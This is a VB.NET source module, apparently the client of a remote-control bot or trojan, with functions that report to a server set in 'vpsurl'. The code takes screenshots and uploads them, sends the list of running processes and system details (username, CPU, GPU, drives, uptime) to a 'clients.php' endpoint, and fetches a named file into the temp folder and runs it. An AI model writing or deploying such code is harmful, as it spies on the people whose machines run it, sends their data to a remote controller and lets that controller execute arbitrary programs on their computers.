Imports System.IO
Imports System.Net
Imports System.Management

Module IndependantActions
    Private Declare Function GetTickCount& Lib "kernel32" () ' System Uptime
    Public Sub TakeScreenshot(fileName As String, ByRef mainWebClient As WebClient)
        Dim screenGrab As Bitmap = Screenshare.TakeBitmapScreenshot()
        Dim bmpBytes As Byte() = Screenshare.ResizeConvertBMP(screenGrab, 75L)
        mainWebClient.UploadData(My.Settings.vpsurl & "clients.php?action=uploadscreenshot&actioncontent=" + fileName, bmpBytes)
    End Sub

    Public Sub OpenURL(url As String)
        Try
            Process.Start(url)
        Catch ex As System.ComponentModel.Win32Exception
            Exit Sub
        End Try
    End Sub

    Public Sub UploadRunningTasks(ByRef mainWebClient As WebClient)
        ' System.Net.WebException : 'Le serveur distant a retourné une erreur : (414) Request-URI Too Long.'
        ' TODO : Find an alternative to send data without passing trought url
        Dim total As String
        For Each p As Process In Process.GetProcesses
            total += "{""processid"":""" & p.Id & ""","
            total += """processname"":""" & p.ProcessName & ""","
            total += """windowname"":""" & p.MainWindowTitle & ""","
            total += """processram"":""" & (p.WorkingSet64 / 1024) / 1024 & """}[;;]" & Environment.NewLine
        Next
        MsgBox(total)
        mainWebClient.DownloadString(My.Settings.vpsurl & "clients.php?action=sendtasks&actioncontent=" & total)
    End Sub

    Public Sub DownloadExecute(fileName As String)
        Dim downloadedBytes As Byte() =
            New WebClient().DownloadData(My.Settings.vpsurl & "files/" & fileName)

        File.WriteAllBytes(Path.GetTempPath & fileName, downloadedBytes)
        Process.Start(Path.GetTempPath & fileName)
    End Sub

    Public Sub GetStatistics(ByRef mainWebClient As WebClient)
        Dim query As New System.Management.SelectQuery("Win32_VideoController")
        Dim search As New System.Management.ManagementObjectSearcher(query)
        Dim info As System.Management.ManagementObject
        Dim cpus = GetObject("WinMgmts:").instancesof("Win32_Processor")
        Dim cpu As String
        Dim gpu As String
        Dim hdds As String
        Dim architecture As String = "32 Bits"
        MsgBox("cc")

        Dim vpsurl As String = My.Settings.vpsurl
        Dim totalinitialisation As String = My.Settings.stats_total_initialisation
        Dim totalinstruction As String = My.Settings.stats_total_instruction
        Dim totaluptime As String = My.Settings.stats_total_uptime
        Dim pcName As String = Environment.UserName
        Dim PCupTime As String = GetTickCount& / 1000
        Dim driveslist = DriveInfo.GetDrives()
        Dim resolution As String = My.Computer.Screen.Bounds.Size.Width & "x" & My.Computer.Screen.Bounds.Size.Height
        For Each g In search.Get()
            gpu = g("Caption").ToString
        Next
        For Each d In driveslist
            hdds += d.Name & " ; " & d.VolumeLabel
        Next
        For Each c In cpus
            cpu = (c.Name.ToString + " " + c.CurrentClockSpeed.ToString + " Mhz")
        Next
        If Environment.Is64BitOperatingSystem Then architecture = "64 Bits"
        Dim totaldata As String = vpsurl & "|" & totalinitialisation & "|" & totalinstruction & "|" & totaluptime & "|" & pcName & "|" & PCupTime & "|" & hdds & "|" & resolution & "|" & cpu & "|" & gpu
        Dim client As New WebClient
        Dim res As String = client.DownloadString(My.Settings.vpsurl & "clients.php?action=sendstatistics&actioncontent=" & totaldata)
    End Sub
End Module
